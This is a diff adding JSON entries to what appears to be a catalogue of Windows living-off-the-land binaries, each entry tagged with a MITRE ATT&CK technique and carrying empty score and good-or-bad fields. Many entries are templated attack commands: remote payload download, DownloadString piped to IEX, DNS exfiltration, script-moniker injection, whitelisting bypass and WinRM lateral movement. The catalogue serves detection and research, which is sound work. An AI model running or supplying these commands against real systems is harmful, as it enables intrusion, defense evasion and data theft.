+    {
+        "ID": 174,
+        "Command": "Sqlps.exe -noprofile",
+        "Description": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging. Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 175,
+        "Command": "SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}",
+        "Description": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging. Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 176,
+        "Command": "squirrel.exe --download {REMOTEURL}",
+        "Description": "The above binary will go to url and look for RELEASES file and download the nuget package. Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 177,
+        "Command": "te.exe {PATH:.wsc}",
+        "Description": "Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file. Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 178,
+        "Command": "teams.exe",
+        "Description": "Generate JavaScript payload and package.json, and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app\\\\\" before executing. Electron runtime binary which runs the Teams application",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.015",
+        "Shell": null
+    },
+    {
+        "ID": 179,
+        "Command": "TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000",
+        "Description": "Sends DNS query for open connection to any host, enabling exfiltration over DNS TestWindowRemoteAgent.exe is the command-line tool to establish RPC",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1048",
+        "Shell": null
+    },
+    {
+        "ID": 180,
+        "Command": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe",
+        "Description": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. Tool included with Microsoft .Net Framework.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 181,
+        "Command": "Update.exe --download {REMOTEURL}",
+        "Description": "The above binary will go to url and look for RELEASES file and download the nuget package. Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 182,
+        "Command": "VSDiagnostics.exe start 1 /launch:{PATH:.exe}",
+        "Description": "Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable. Command-line tool used for performing diagnostics.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 183,
+        "Command": "VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\"",
+        "Description": "The above binary will execute other binary. Binary will execute specified binary. Part of VS/VScode installation.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 184,
+        "Command": "Visio.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Visio Executable",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 185,
+        "Command": "VisualUiaVerifyNative.exe",
+        "Description": "Generate Serialized gadget and save to - C:\\Users\\[current user]\\AppData\\Roaminguiverify.config before executing. A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 186,
+        "Command": "VSLaunchBrowser.exe .exe {REMOTEURL:.exe}",
+        "Description": "Download and execute payload from remote server Microsoft Visual Studio browser launcher tool for web applications debugging",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 187,
+        "Command": "vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:",
+        "Description": "Executes specified executable from vshadow.exe. VShadow is a command-line tool that can be used to create and manage volume shadow copies.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 188,
+        "Command": "Vsjitdebugger.exe {PATH:.exe}",
+        "Description": "Executes specified executable as a subprocess of Vsjitdebugger.exe. Just-In-Time (JIT) debugger included with Visual Studio",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 189,
+        "Command": "WFMFormat.exe",
+        "Description": "Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5. Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 190,
+        "Command": "wfc.exe {PATH_ABSOLUTE:.xoml}",
+        "Description": "Execute arbitrary C# code embedded in a XOML file. The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 191,
+        "Command": "WinProj.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Project Executable",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 192,
+        "Command": "winword.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Office binary",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 193,
+        "Command": "wsl.exe -e /mnt/c/Windows/System32/calc.exe",
+        "Description": "Executes calc.exe from wsl.exe Windows subsystem for Linux executable",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 194,
+        "Command": "devtunnel.exe host -p 8080",
+        "Description": "Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet. Binary to enable forwarded ports on windows operating systems.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 195,
+        "Command": "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}",
+        "Description": "Load a library payload using the --agentExtensionPath parameter (32-bit) Agent for Visual Studio Live Share (Code Collaboration)",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 196,
+        "Command": "vstest.console.exe {PATH:.dll}",
+        "Description": "VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general VSTest.Console.exe is the command-line tool to run tests",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 197,
+        "Command": "winfile.exe {PATH:.exe}",
+        "Description": "Execute an executable file with WinFile as a parent process. Windows File Manager executable",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 198,
+        "Command": "xsd.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server XML Schema Definition Tool included with the Windows Software Development Kit (SDK).",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 199,
+        "Command": "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\"",
+        "Description": "Proxy execute Managed DLL with PowerShell PowerShell Diagnostic Script",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216",
+        "Shell": null
+    },
+    {
+        "ID": 200,
+        "Command": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}",
+        "Description": "Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable. Proxy execution with CL_Mutexverifiers.ps1",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216",
+        "Shell": null
+    },
+    {
+        "ID": 201,
+        "Command": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke {CMD}",
+        "Description": "Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable. Aero diagnostics script",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216",
+        "Shell": null
+    },
+    {
+        "ID": 202,
+        "Command": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}",
+        "Description": "Execute binaries from the context of the signed script using the \"VsWherePath\" flag. Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216",
+        "Shell": null
+    },
+    {
+        "ID": 203,
+        "Command": "set comspec={PATH_ABSOLUTE:.exe} & cscript c:\\windows\\system32\\manage-bde.wsf",
+        "Description": "Set the comspec variable to another executable prior to calling manage-bde.wsf for execution. Script for managing BitLocker",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216",
+        "Shell": null
+    },
+    {
+        "ID": 204,
+        "Command": "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}",
+        "Description": "Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection Proxy execution with Pubprn.vbs",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216.001",
+        "Shell": null
+    },
+    {
+        "ID": 205,
+        "Command": "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"",
+        "Description": "Inject PowerShell script code with the provided arguments Script used related to app-v and publishing server",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216.002",
+        "Shell": null
+    },
+    {
+        "ID": 206,
+        "Command": "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\"",
+        "Description": "Proxy execute Managed DLL with PowerShell PowerShell Diagnostic Script",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216",
+        "Shell": null
+    },
+    {
+        "ID": 207,
+        "Command": "winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"{CMD}\"} -r:http://target:5985",
+        "Description": "Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol Script used for manage Windows RM settings",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216",
+        "Shell": null
+    },
+    {
+        "ID": 208,
+        "Command": "Pester.bat [/help|?|-?|/?] \"$null; {CMD}\"",
+        "Description": "Execute code using Pester. The third parameter can be anything. The fourth is the payload. Used as part of the Powershell pester",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1216",
+        "Shell": null
+    }
+]
